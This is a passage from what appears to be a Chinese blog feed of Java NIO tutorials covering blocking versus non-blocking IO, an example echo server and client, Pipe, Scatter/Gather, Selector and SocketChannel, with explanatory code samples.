<p>正如你可以看到，该处理程序仅在有新数据读入时运行，并知道每步的数据是什么。一旦正在运行的线程已处理过读入的某些数据，该线程不会再回退数据（大多如此）。下图也说明了这条原则：</p>
<p>? <img src="/images/java/nio-vs-io-1.png"></p>
<p>（<strong>Java IO: 从一个阻塞的流中读数据</strong>）</p>
<p>?而一个NIO的实现会有所不同，下面是一个简单的例子：</p>
<pre><code>ByteBuffer buffer = ByteBuffer.allocate(48);
int bytesRead = inChannel.read(buffer);
</code></pre>
<p>注意第二行，从通道读取字节到ByteBuffer。当这个方法调用返回时，你不知道你所需的所有数据是否在缓冲区内。你所知道的是，该缓冲区包含一些字节，这使得处理有点困难。</p>
<p>假设第一次read(buffer)调用后，读入缓冲区的数据只有半行，例如，“Name:An”，你能处理数据吗？显然不能，需要等待，直到整行数据读入缓存，在此之前，对数据的任何处理毫无意义。</p>
<p>所以，你怎么知道是否该缓冲区包含足够的数据可以处理呢？好了，你不知道。发现的方法只能查看缓冲区中的数据。其结果是，在你知道所有数据都在缓冲区里之前，你必须检查几次缓冲区的数据。这不仅效率低下，而且可以使程序设计方案杂乱不堪。例如：</p>
<pre><code>ByteBuffer buffer = ByteBuffer.allocate(48);
int bytesRead = inChannel.read(buffer)
while(! bufferFull(bytesRead) ) &#123;
bytesRead = inChannel.read(buffer);
&#125;
</code></pre>
<p>bufferFull()方法必须跟踪有多少数据读入缓冲区，并返回真或假，这取决于缓冲区是否已满。换句话说，如果缓冲区准备好被处理，那么表示缓冲区满了。</p>
<p>bufferFull()方法扫描缓冲区，但必须保持在bufferFull（）方法被调用之前状态相同。如果没有，下一个读入缓冲区的数据可能无法读到正确的位置。这是不可能的，但却是需要注意的又一问题。</p>
<p>如果缓冲区已满，它可以被处理。如果它不满，并且在你的实际案例中有意义，你或许能处理其中的部分数据。但是许多情况下并非如此。下图展示了“缓冲区数据循环就绪”：</p>
<p><img src="/images/java/nio-vs-io-2.png"></p>
<p><strong>Java NIO:从一个通道里读数据，直到所有的数据都读到缓冲区里.</strong></p>
<p><strong>3) 用来处理数据的线程数</strong></p>
<p>NIO可让您只使用一个（或几个）单线程管理多个通道（网络连接或文件），但付出的代价是解析数据可能会比从一个阻塞流中读取数据更复杂。</p>
<p>如果需要管理同时打开的成千上万个连接，这些连接每次只是发送少量的数据，例如聊天服务器，实现NIO的服务器可能是一个优势。同样，如果你需要维持许多打开的连接到其他计算机上，如P2P网络中，使用一个单独的线程来管理你所有出站连接，可能是一个优势。一个线程多个连接的设计方案如下图所示：</p>
<p><img src="/images/java/nio-vs-io-3.png"></p>
<p><strong>Java NIO: 单线程管理多个连接</strong></p>
<p>如果你有少量的连接使用非常高的带宽，一次发送大量的数据，也许典型的IO服务器实现可能非常契合。下图说明了一个典型的IO服务器设计：</p>
<p><img src="/images/java/nio-vs-io-4.png"></p>
<p><strong>Java IO: 一个典型的IO服务器设计- 一个连接通过一个线程处理.</strong></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之WEB服务器</title>
    <url>/blog/plang/java/nio/nioserver/</url>
    <content><![CDATA[<p><img src="/images/java/nioserver.jpg"></p>
<h3 id="NIOServer"><a href="#NIOServer" class="headerlink" title="NIOServer"></a>NIOServer</h3><pre><code>package com.iteedu.nioserver;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.Iterator;

/**
 * NIO服务端
 */
public class NIOServer &#123;
    //通道管理器
    private Selector selector;

    /**
     * 获得一个ServerSocket通道，并对该通道做一些初始化的工作
     * @param port  绑定的端口号
     * @throws IOException
     */
    public void initServer(int port) throws IOException &#123;
        // 获得一个ServerSocket通道
        ServerSocketChannel serverChannel = ServerSocketChannel.open();
        // 设置通道为非阻塞
        serverChannel.configureBlocking(false);
        // 将该通道对应的ServerSocket绑定到port端口
        serverChannel.socket().bind(new InetSocketAddress(port));
        // 获得一个通道管理器
        this.selector = Selector.open();
        //将通道管理器和该通道绑定，并为该通道注册SelectionKey.OP_ACCEPT事件,注册该事件后，
        //当该事件到达时，selector.select()会返回，如果该事件没到达selector.select()会一直阻塞。
        serverChannel.register(selector, SelectionKey.OP_ACCEPT);
    &#125;

    /**
     * 采用轮询的方式监听selector上是否有需要处理的事件，如果有，则进行处理
     * @throws IOException
     */
    public void listen() throws IOException &#123;
        System.out.println(&quot;服务端启动成功！&quot;);
        // 轮询访问selector
        while (true) &#123;
            //当注册的事件到达时，方法返回；否则,该方法会一直阻塞
            selector.select();
            // 获得selector中选中的项的迭代器，选中的项为注册的事件
            Iterator ite = this.selector.selectedKeys().iterator();
            while (ite.hasNext()) &#123;
                SelectionKey key = ite.next();
                // 删除已选的key,以防重复处理
                ite.remove();
                // 客户端请求连接事件
                if (key.isAcceptable()) &#123;
                    ServerSocketChannel server = (ServerSocketChannel) key
                            .channel();
                    // 获得和客户端连接的通道
                    SocketChannel channel = server.accept();
                    // 设置成非阻塞
                    channel.configureBlocking(false);

                    //在这里可以给客户端发送信息哦
                    channel.write(ByteBuffer.wrap(new String(&quot;向客户端发送了一条信息&quot;).getBytes()));
                    //在和客户端连接成功之后，为了可以接收到客户端的信息，需要给通道设置读的权限。
                    channel.register(this.selector, SelectionKey.OP_READ);
                    
                    // 获得了可读的事件
                &#125; else if (key.isReadable()) &#123;
                        read(key);
                &#125;

            &#125;

        &#125;
    &#125;
    /**
     * 处理读取客户端发来的信息 的事件
     * @param key
     * @throws IOException 
     */
    public void read(SelectionKey key) throws IOException&#123;
        // 服务器可读取消息:得到事件发生的Socket通道
        SocketChannel channel = (SocketChannel) key.channel();
        // 创建读取的缓冲区
        ByteBuffer buffer = ByteBuffer.allocate(10);
        channel.read(buffer);
        byte[] data = buffer.array();
        String msg = new String(data).trim();
        System.out.println(&quot;服务端收到信息：&quot;+msg);
        ByteBuffer outBuffer = ByteBuffer.wrap(msg.getBytes());
        channel.write(outBuffer);// 将消息回送给客户端
    &#125;
    
    /**
     * 启动服务端测试
     * @throws IOException 
     */
    public static void main(String[] args) throws IOException &#123;
        NIOServer server = new NIOServer();
        server.initServer(8000);
        server.listen();
    &#125;

&#125;
</code></pre>
<h3 id="NIOClient"><a href="#NIOClient" class="headerlink" title="NIOClient"></a>NIOClient</h3><pre><code>package com.iteedu.nioserver;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.util.Iterator;

/**
 * NIO客户端
 * 
 */
public class NIOClient &#123;
    // 通道管理器
    private Selector selector;

    /**
     * 获得一个Socket通道，并对该通道做一些初始化的工作
     * 
     * @param ip
     *            连接的服务器的ip
     * @param port
     *            连接的服务器的端口号
     * @throws IOException
     */
    public void initClient(String ip, int port) throws IOException &#123;
        // 获得一个Socket通道
        SocketChannel channel = SocketChannel.open();
        // 设置通道为非阻塞
        channel.configureBlocking(false);
        // 获得一个通道管理器
        this.selector = Selector.open();

        // 客户端连接服务器,其实方法执行并没有实现连接，需要在listen（）方法中调
        // 用channel.finishConnect();才能完成连接
        channel.connect(new InetSocketAddress(ip, port));
        // 将通道管理器和该通道绑定，并为该通道注册SelectionKey.OP_CONNECT事件。
        channel.register(selector, SelectionKey.OP_CONNECT);
    &#125;

    /**
     * 采用轮询的方式监听selector上是否有需要处理的事件，如果有，则进行处理
     * 
     * @throws IOException
     */
    public void listen() throws IOException &#123;
        // 轮询访问selector
        while (true) &#123;
            selector.select();
            // 获得selector中选中的项的迭代器
            Iterator ite = this.selector.selectedKeys()
                    .iterator();
            while (ite.hasNext()) &#123;
                SelectionKey key = ite.next();
                // 删除已选的key,以防重复处理
                ite.remove();
                // 连接事件发生
                if (key.isConnectable()) &#123;
                    SocketChannel channel = (SocketChannel) key.channel();
                    // 如果正在连接，则完成连接
                    if (channel.isConnectionPending()) &#123;
                        channel.finishConnect();

                    &#125;
                    // 设置成非阻塞
                    channel.configureBlocking(false);

                    // 在这里可以给服务端发送信息哦
                    channel.write(ByteBuffer.wrap(new String(&quot;向服务端发送了一条信息&quot;)
                            .getBytes()));
                    // 在和服务端连接成功之后，为了可以接收到服务端的信息，需要给通道设置读的权限。
                    channel.register(this.selector, SelectionKey.OP_READ);

                    // 获得了可读的事件
                &#125; else if (key.isReadable()) &#123;
                    read(key);
                &#125;

            &#125;

        &#125;
    &#125;

    /**
     * 处理读取服务端发来的信息 的事件
     * 
     * @param key
     * @throws IOException
     */
    public void read(SelectionKey key) throws IOException &#123;
        // 服务器可读取消息:得到事件发生的Socket通道
        SocketChannel channel = (SocketChannel) key.channel();
        // 创建读取的缓冲区
        ByteBuffer buffer = ByteBuffer.allocate(10);
        channel.read(buffer);
        byte[] data = buffer.array();
        String msg = new String(data).trim();
        System.out.println(&quot;客户端收到信息：&quot; + msg);
        ByteBuffer outBuffer = ByteBuffer.wrap(msg.getBytes());
        channel.write(outBuffer);// 将消息回送给客户端
    &#125;

    /**
     * 启动客户端测试
     * 
     * @throws IOException
     */
    public static void main(String[] args) throws IOException &#123;
        NIOClient client = new NIOClient();
        client.initClient(&quot;localhost&quot;, 8000);
        client.listen();
    &#125;

&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>Java NIO 概述</title>
    <url>/blog/plang/java/nio/overview/</url>
    <content><![CDATA[<p>Java NIO 由以下几个核心部分组成：</p>
<ul>
<li>Channels</li>
<li>Buffers</li>
<li>Selectors</li>
</ul>
<p>虽然Java NIO 中除此之外还有很多类和组件，但在我看来，Channel，Buffer 和Selector构成了核心的API。其它组件，如Pipe和FileLock，只不过是与三个核心组件共同使用的工具类。因此，在概述中我将集中在这三个组件上。其它组件会在单独的章节中讲到。</p>
<h3 id="Channel-和-Buffer"><a href="#Channel-和-Buffer" class="headerlink" title="Channel 和 Buffer"></a>Channel 和 Buffer</h3><p>基本上，所有的 IO 在NIO 中都从一个Channel 开始。Channel 有点象流。<br>数据可以从Channel读到Buffer中，也可以从Buffer<br>写到Channel中。这里有个图示：</p>
<p><img src="/images/java/niobuffers1.png"></p>
<p>Channel和Buffer有好几种类型。下面是JAVA NIO中的一些主要Channel的实现：</p>
<ul>
<li>FileChannel</li>
<li>DatagramChannel</li>
<li>SocketChannel</li>
<li>ServerSocketChannel</li>
</ul>
<p>正如你所看到的，这些通道涵盖了UDP 和 TCP 网络IO，以及文件IO。</p>
<p>与这些类一起的有一些有趣的接口，但为简单起见，我尽量在概述中不提到它们。本教程其它章节与它们相关的地方我会进行解释。</p>
<p>以下是Java NIO里关键的Buffer实现：</p>
<ul>
<li>ByteBuffer</li>
<li>CharBuffer</li>
<li>DoubleBuffer</li>
<li>FloatBuffer</li>
<li>IntBuffer</li>
<li>LongBuffer</li>
<li>ShortBuffer</li>
</ul>
<p>这些Buffer覆盖了你能通过IO发送的基本数据类型：byte, short, int, long,<br>float, double 和 char。</p>
<p>Java NIO 还有个 MappedByteBuffer，用于表示内存映射文件，<br>我也不打算在概述中说明。</p>
<h2 id="Selector"><a href="#Selector" class="headerlink" title="Selector"></a>Selector</h2><p>Selector允许单线程处理多个Channel。如果你的应用打开了多个连接（通道），但每个连接的流量都很低，使用Selector就会很方便。例如，在一个聊天服务器中。</p>
<p>这是在一个单线程中使用一个Selector处理3个Channel的图示：</p>
<p><img src="/images/java/nioselectors.png"></p>
<p>要使用Selector，得向Selector注册Channel，然后调用它的select()方法。这个方法会一直阻塞到某个注册的通道有事件就绪。一旦这个方法返回，线程就可以处理这些事件，事件的例子有如新连接进来，数据接收等。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之Pipe</title>
    <url>/blog/plang/java/nio/pipe/</url>
    <content><![CDATA[<p>Java NIO管道是2个线程之间的单向数据连接。<code>Pipe</code>有一个source通道和一个sink通道。数据会被写到sink通道，从source通道读取。</p>
<p>这里是Pipe原理的图示：</p>
<p><img src="/images/java/niopipe.png"></p>
<h3 id="创建管道"><a href="#创建管道" class="headerlink" title="创建管道"></a>创建管道</h3><p>通过<code>Pipe.open()</code>方法打开管道。例如：</p>
<pre><code>Pipe pipe = Pipe.open();
</code></pre>
<h3 id="向管道写数据"><a href="#向管道写数据" class="headerlink" title="向管道写数据"></a>向管道写数据</h3><p>要向管道写数据，需要访问sink通道。像这样：</p>
<pre><code>Pipe.SinkChannel sinkChannel = pipe.sink();
</code></pre>
<p>通过调用SinkChannel的<code>write()</code>方法，将数据写入<code>SinkChannel</code>,像这样：</p>
<pre><code>String newData = &quot;New String to write to file...&quot; + System.currentTimeMillis();
ByteBuffer buf = ByteBuffer.allocate(48);
buf.clear();
buf.put(newData.getBytes());

buf.flip();

while(buf.hasRemaining()) &#123;
    sinkChannel.write(buf);
&#125;
</code></pre>
<h3 id="从管道读取数据"><a href="#从管道读取数据" class="headerlink" title="从管道读取数据"></a>从管道读取数据</h3><p>从读取管道的数据，需要访问source通道，像这样：</p>
<pre><code>Pipe.SourceChannel sourceChannel = pipe.source();
</code></pre>
<p>调用source通道的<code>read()</code>方法来读取数据，像这样：</p>
<pre><code>ByteBuffer buf = ByteBuffer.allocate(48);

int bytesRead = sourceChannel.read(buf);
</code></pre>
<p><code>read()</code>方法返回的int值会告诉我们多少字节被读进了缓冲区。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之Scatter/Gather</title>
    <url>/blog/plang/java/nio/scattergather/</url>
    <content><![CDATA[<p>Java NIO开始支持scatter&#x2F;gather，scatter&#x2F;gather用于描述从Channel（译者注：Channel在中文经常翻译为通道）中读取或者写入到Channel的操作。</p>
<p>分散（scatter）从Channel中读取是指在读操作时将读取的数据写入多个buffer中。因此，Channel将从Channel中读取的数据“分散（scatter）”到多个Buffer中。</p>
<p>聚集（gather）写入Channel是指在写操作时将多个buffer的数据写入同一个Channel，因此，Channel<br>将多个Buffer中的数据“聚集（gather）”后发送到Channel。</p>
<p>scatter gather经常用于需要将传输的数据分开处理的场合，例如传输一个由消息头和消息体组成的消息，你可能会将消息体和消息头分散到不同的buffer中，这样你可以方便的处理消息头和消息体。</p>
<p><strong>Scattering Reads</strong></p>
<p>Scattering Reads是指数据从一个channel读取到多个buffer中。如下图描述：</p>
<p><img src="/images/java/nioscatter.png"></p>
<p>代码示例如下：</p>
<pre><code>ByteBuffer header = ByteBuffer.allocate(128);
ByteBuffer body   = ByteBuffer.allocate(1024);
ByteBuffer[] bufferArray = &#123; header, body &#125;;
channel.read(bufferArray);
</code></pre>
<p>注意buffer首先被插入到数组，然后再将数组作为channel.read()的输入参数。read()方法按照buffer在数组中的顺序将从channel中读取的数据写入到buffer，当一个buffer被写满后，channel紧接着向另一个buffer中写。</p>
<p>Scattering Reads在移动下一个buffer前，必须填满当前的buffer，这也意味着它不适用于动态消息(译者注：消息大小不固定)。换句话说，如果存在消息头和消息体，消息头必须完成填充（例如128byte），Scattering Reads才能正常工作。</p>
<p><strong>Gathering Writes</strong></p>
<p>Gathering Writes是指数据从多个buffer写入到同一个channel。如下图描述：</p>
<p><img src="/images/java/niogather.png"></p>
<p>代码示例如下：</p>
<pre><code>ByteBuffer header = ByteBuffer.allocate(128);
ByteBuffer body   = ByteBuffer.allocate(1024);
//write data into buffers
ByteBuffer[] bufferArray = &#123; header, body &#125;;
channel.write(bufferArray);
</code></pre>
<p>buffers数组是write()方法的入参，write()方法会按照buffer在数组中的顺序，将数据写入到channel，注意只有position和limit之间的数据才会被写入。因此，如果一个buffer的容量为128byte，但是仅仅包含58byte的数据，那么这58byte的数据将被写入到channel中。因此与Scattering Reads相反，Gathering Writes能较好的处理动态消息。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之Selector</title>
    <url>/blog/plang/java/nio/selector/</url>
    <content><![CDATA[<p>Selector（选择器）是Java<br>NIO中能够检测一到多个NIO通道，并能够知晓通道是否为诸如读写事件做好准备的组件。这样，一个单独的线程可以管理多个channel，从而管理多个网络连接。</p>
<p>下面是本文所涉及到的主题列表：</p>
<p>[TOC]</p>
<h3 id="为什么使用Selector"><a href="#为什么使用Selector" class="headerlink" title="为什么使用Selector?"></a>为什么使用Selector?</h3><p>仅用单个线程来处理多个Channels的好处是，只需要更少的线程来处理通道。事实上，可以只用一个线程处理所有的通道。对于操作系统来说，线程之间上下文切换的开销很大，而且每个线程都要占用系统的一些资源（如内存）。因此，使用的线程越少越好。</p>
<p>但是，需要记住，现代的操作系统和CPU在多任务方面表现的越来越好，所以多线程的开销随着时间的推移，变得越来越小了。实际上，如果一个CPU有多个内核，不使用多任务可能是在浪费CPU能力。不管怎么说，关于那种设计的讨论应该放在另一篇不同的文章中。在这里，只要知道使用Selector能够处理多个通道就足够了。</p>
<p>下面是单线程使用一个Selector处理3个channel的示例图：</p>
<p><img src="/images/java/nioselectors.png"></p>
<h3 id="Selector的创建"><a href="#Selector的创建" class="headerlink" title="Selector的创建"></a>Selector的创建</h3><p>通过调用Selector.open()方法创建一个Selector，如下：</p>
<pre><code>Selector selector = Selector.open(); 
</code></pre>
<h3 id="向Selector注册通道"><a href="#向Selector注册通道" class="headerlink" title="向Selector注册通道"></a>向Selector注册通道</h3><p>为了将Channel和Selector配合使用，必须将channel注册到selector上。通过SelectableChannel.register()方法来实现，如下：</p>
<pre><code>channel.configureBlocking(false);
SelectionKey key = channel.register(selector,
    Selectionkey.OP_READ);
</code></pre>
<p>与Selector一起使用时，Channel必须处于非阻塞模式下。这意味着不能将FileChannel与Selector一起使用，因为FileChannel不能切换到非阻塞模式。而套接字通道都可以。</p>
<p>注意register()方法的第二个参数。这是一个“interest集合”，意思是在通过Selector监听Channel时对什么事件感兴趣。可以监听四种不同类型的事件：</p>
<ol>
<li>Connect</li>
<li>Accept</li>
<li>Read</li>
<li>Write</li>
</ol>
<p>通道触发了一个事件意思是该事件已经就绪。所以，某个channel成功连接到另一个服务器称为“连接就绪”。一个server socket channel准备好接收新进入的连接称为“接收就绪”。一个有数据可读的通道可以说是“读就绪”。等待写数据的通道可以说是“写就绪”。</p>
<p>这四种事件用SelectionKey的四个常量来表示：</p>
<ol>
<li>SelectionKey.OP_CONNECT</li>
<li>SelectionKey.OP_ACCEPT</li>
<li>SelectionKey.OP_READ</li>
<li>SelectionKey.OP_WRITE</li>
</ol>
<p>如果你对不止一种事件感兴趣，那么可以用“位或”操作符将常量连接起来，如下：</p>
<pre><code>int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE;
</code></pre>
<p>在下面还会继续提到interest集合。</p>
<h3 id="SelectionKey"><a href="#SelectionKey" class="headerlink" title="SelectionKey"></a>SelectionKey</h3><p>在上一小节中，当向Selector注册Channel时，register()方法会返回一个SelectionKey对象。这个对象包含了一些你感兴趣的属性：</p>
<ul>
<li>interest集合</li>
<li>ready集合</li>
<li>Channel</li>
<li>Selector</li>
<li>附加的对象（可选）</li>
</ul>
<p>下面我会描述这些属性。</p>
<h4 id="interest集合"><a href="#interest集合" class="headerlink" title="interest集合"></a>interest集合</h4><p>就像<a href="#Registering">Selector注册通道</a>一节中所描述的，interest集合是你所选择的感兴趣的事件集合。可以通过SelectionKey读写interest集合，像这样：</p>
<pre><code>int interestSet = selectionKey.interestOps();

boolean isInterestedInAccept  = interestSet &amp; SelectionKey.OP_ACCEPT == SelectionKey.OP_ACCEPT；
boolean isInterestedInConnect = interestSet &amp; SelectionKey.OP_CONNECT == SelectionKey.OP_CONNECT;
boolean isInterestedInRead    = interestSet &amp; SelectionKey.OP_READ == SelectionKey.OP_READ;
boolean isInterestedInWrite   = interestSet &amp; SelectionKey.OP_WRITE == SelectionKey.OP_WRITE; 
</code></pre>
<p>可以看到，用“位与”操作interest集合和给定的SelectionKey常量，可以确定某个确定的事件是否在interest<br>集合中。</p>
<h4 id="ready集合"><a href="#ready集合" class="headerlink" title="ready集合"></a>ready集合</h4><p>ready集合是通道已经准备就绪的操作的集合。在一次选择(Selection)之后，你会首先访问这个ready<br>set。Selection将在下一小节进行解释。可以这样访问ready集合：</p>
<pre><code>int readySet = selectionKey.readyOps();
</code></pre>
<p>可以用像检测interest集合那样的方法，来检测channel中什么事件或操作已经就绪。但是，也可以使用以下四个方法，它们都会返回一个布尔类型：</p>
<pre><code>selectionKey.isAcceptable();
selectionKey.isConnectable();
selectionKey.isReadable();
selectionKey.isWritable();
</code></pre>
<h4 id="Channel-Selector"><a href="#Channel-Selector" class="headerlink" title="Channel + Selector"></a>Channel + Selector</h4><p>从SelectionKey访问Channel和Selector很简单。如下：</p>
<pre><code>Channel  channel  = selectionKey.channel();
Selector selector = selectionKey.selector();
</code></pre>
<h4 id="附加的对象"><a href="#附加的对象" class="headerlink" title="附加的对象"></a>附加的对象</h4><p>可以将一个对象或者更多信息附着到SelectionKey上，这样就能方便的识别某个给定的通道。例如，可以附加<br>与通道一起使用的Buffer，或是包含聚集数据的某个对象。使用方法如下：</p>
<pre><code>selectionKey.attach(theObject);
Object attachedObj = selectionKey.attachment();
</code></pre>
<p>还可以在用register()方法向Selector注册Channel的时候附加对象。如：</p>
<pre><code>SelectionKey key = channel.register(selector, SelectionKey.OP_READ, theObject);
</code></pre>
<h3 id="通过Selector选择通道"><a href="#通过Selector选择通道" class="headerlink" title="通过Selector选择通道"></a>通过Selector选择通道</h3><p>一旦向Selector注册了一或多个通道，就可以调用几个重载的select()方法。这些方法返回你所感兴趣的事件（如连接、接受、读或写）已经准备就绪的那些通道。换句话说，如果你对“读就绪”的通道感兴趣，select()方法会返回读事件已经就绪的那些通道。</p>
<p>下面是select()方法：</p>
<ul>
<li>int select()</li>
<li>int select(long timeout)</li>
<li>int selectNow()</li>
</ul>
<p><code>select()</code>阻塞到至少有一个通道在你注册的事件上就绪了。</p>
<p><code>select(long timeout)</code>和select()一样，除了最长会阻塞timeout毫秒(参数)。</p>
<p><code>selectNow()</code>不会阻塞，不管什么通道就绪都立刻返回（<em>译者注：此方法执行非阻塞的选择操作。如果自从前一次选择操作后，没有通道变成可选择的，则此方法直接返回零。</em>）。</p>
<p>select()方法返回的int值表示有多少通道已经就绪。亦即，自上次调用select()方法后有多少通道变成就绪状态。如果调用select()方法，因为有一个通道变成就绪状态，返回了1，若再次调用select()方法，如果另一个通道就绪了，它会再次返回1。如果对第一个就绪的channel没有做任何操作，现在就有两个就绪的通道，但在每次select()方法调用之间，只有一个通道就绪了。</p>
<h4 id="selectedKeys"><a href="#selectedKeys" class="headerlink" title="selectedKeys()"></a>selectedKeys()</h4><p>一旦调用了select()方法，并且返回值表明有一个或更多个通道就绪了，然后可以通过调用selector的selectedKeys()方法，访问“已选择键集（selected key set）”中的就绪通道。如下所示：</p>
<pre><code>Set selectedKeys = selector.selectedKeys();
</code></pre>
<p>当像Selector注册Channel时，Channel.register()方法会返回一个SelectionKey 对象。这个对象代表了注册到该Selector的通道。可以通过SelectionKey的selectedKeySet()方法访问这些对象。</p>
<p>可以遍历这个已选择的键集合来访问就绪的通道。如下：</p>
<pre><code>Set selectedKeys = selector.selectedKeys();
Iterator keyIterator = selectedKeys.iterator();
while(keyIterator.hasNext()) &#123;
    SelectionKey key = keyIterator.next();
    if(key.isAcceptable()) &#123;
        // a connection was accepted by a ServerSocketChannel.
    &#125; else if (key.isConnectable()) &#123;
        // a connection was established with a remote server.
    &#125; else if (key.isReadable()) &#123;
        // a channel is ready for reading
    &#125; else if (key.isWritable()) &#123;
        // a channel is ready for writing
    &#125;
    keyIterator.remove();
&#125;
</code></pre>
<p>这个循环遍历已选择键集中的每个键，并检测各个键所对应的通道的就绪事件。</p>
<p>注意每次迭代末尾的keyIterator.remove()调用。Selector不会自己从已选择键集中移除SelectionKey实例。必须在处理完通道时自己移除。下次该通道变成就绪时，Selector会再次将其放入已选择键集中。</p>
<p>SelectionKey.channel()方法返回的通道需要转型成你要处理的类型，如ServerSocketChannel或SocketChannel等。</p>
<h3 id="wakeUp"><a href="#wakeUp" class="headerlink" title="wakeUp()"></a>wakeUp()</h3><p>某个线程调用select()方法后阻塞了，即使没有通道已经就绪，也有办法让其从select()方法返回。只要让其它线程在第一个线程调用select()方法的那个对象上调用Selector.wakeup()方法即可。阻塞在select()方法上的线程会立马返回。</p>
<p>如果有其它线程调用了wakeup()方法，但当前没有线程阻塞在select()方法上，下个调用select()方法的线程会立即“醒来（wake up）”。</p>
<h3 id="close"><a href="#close" class="headerlink" title="close()"></a>close()</h3><p>用完Selector后调用其close()方法会关闭该Selector，且使注册到该Selector上的所有SelectionKey实例无效。通道本身并不会关闭。</p>
<h3 id="完整的示"><a href="#完整的示" class="headerlink" title="完整的示"></a>完整的示</h3><p>这里有一个完整的示例，打开一个Selector，注册一个通道注册到这个Selector上(通道的初始化过程略去),然后持续监控这个Selector的四种事件（接受，连接，读，写）是否就绪。</p>
<pre><code>Selector selector = Selector.open();
channel.configureBlocking(false);
SelectionKey key = channel.register(selector, SelectionKey.OP_READ);
while(true) &#123;
  int readyChannels = selector.select();
  if(readyChannels == 0) continue;
  Set selectedKeys = selector.selectedKeys();
  Iterator keyIterator = selectedKeys.iterator();
  while(keyIterator.hasNext()) &#123;
    SelectionKey key = keyIterator.next();
    if(key.isAcceptable()) &#123;
        // a connection was accepted by a ServerSocketChannel.
    &#125; else if (key.isConnectable()) &#123;
        // a connection was established with a remote server.
    &#125; else if (key.isReadable()) &#123;
        // a channel is ready for reading
    &#125; else if (key.isWritable()) &#123;
        // a channel is ready for writing
    &#125;
    keyIterator.remove();
  &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之SocketChannel</title>
    <url>/blog/plang/java/nio/socketchannel/</url>
    <content><![CDATA[<p>Java NIO中的SocketChannel是一个连接到TCP网络套接字的通道。可以通过以下2种方式创建SocketChannel：</p>
<ol>
<li>打开一个SocketChannel并连接到互联网上的某台服务器。</li>
<li>一个新连接到达ServerSocketChannel时，会创建一个SocketChannel。</li>
</ol>
<h3 id="打开-SocketChannel"><a href="#打开-SocketChannel" class="headerlink" title="打开 SocketChannel"></a>打开 SocketChannel</h3><p>下面是SocketChannel的打开方式：</p>
<pre><code>SocketChannel socketChannel = SocketChannel.open();
socketChannel.connect(new InetSocketAddress(&quot;http://jenkov.com&quot;, 80));
</code></pre>
<h3 id="关闭-SocketChannel"><a href="#关闭-SocketChannel" class="headerlink" title="关闭 SocketChannel"></a>关闭 SocketChannel</h3><p>当用完SocketChannel之后调用SocketChannel.close()关闭SocketChannel：</p>
<pre><code>socketChannel.close();
</code></pre>
<h3 id="从-SocketChannel-读取数据"><a href="#从-SocketChannel-读取数据" class="headerlink" title="从 SocketChannel 读取数据"></a>从 SocketChannel 读取数据</h3><p>要从SocketChannel中读取数据，调用一个read()的方法之一。以下是例子：</p>
<pre><code>ByteBuffer buf = ByteBuffer.allocate(48);
int bytesRead = socketChannel.read(buf);
</code></pre>
<p>首先，分配一个Buffer。从SocketChannel读取到的数据将会放到这个Buffer中。</p>
<p>然后，调用SocketChannel.read()。该方法将数据从SocketChannel<br>读到Buffer中。read()方法返回的int值表示读了多少字节进Buffer里。如果返回的是-1，表示已经读到了流的末尾（连接关闭了）。</p>
<h3 id="写入-SocketChannel"><a href="#写入-SocketChannel" class="headerlink" title="写入 SocketChannel"></a>写入 SocketChannel</h3><p>写数据到SocketChannel用的是SocketChannel.write()方法，该方法以一个Buffer作为参数。示例如下：</p>
<pre><code>String newData = &quot;New String to write to file...&quot; + System.currentTimeMillis();

ByteBuffer buf = ByteBuffer.allocate(48);
buf.clear();
buf.put(newData.getBytes());

buf.flip();

while(buf.hasRemaining()) &#123;
    channel.write(buf);
&#125;
</code></pre>
<p>注意SocketChannel.write()方法的调用是在一个while循环中的。Write()方法无法保证能写多少字节到SocketChannel。所以，我们重复调用write()直到Buffer没有要写的字节为止。</p>
<h3 id="非阻塞模式"><a href="#非阻塞模式" class="headerlink" title="非阻塞模式"></a>非阻塞模式</h3><p>可以设置 SocketChannel 为非阻塞模式（non-blocking mode）.设置之后，就可以在异步模式下调用connect(), read() 和write()了。</p>
<h4 id="connect"><a href="#connect" class="headerlink" title="connect()"></a>connect()</h4><p>如果SocketChannel在非阻塞模式下，此时调用connect()，该方法可能在连接建立之前就返回了。为了确定连接是否建立，可以调用finishConnect()的方法。像这样：</p>
<pre><code>socketChannel.configureBlocking(false);
socketChannel.connect(new InetSocketAddress(&quot;http://jenkov.com&quot;, 80));

while(! socketChannel.finishConnect() )&#123;
    //wait, or do something else...
&#125;
</code></pre>
<h4 id="write"><a href="#write" class="headerlink" title="write()"></a>write()</h4><p>非阻塞模式下，write()方法在尚未写出任何内容时可能就返回了。所以需要在循环中调用write()。前面已经有例子了，这里就不赘述了。</p>
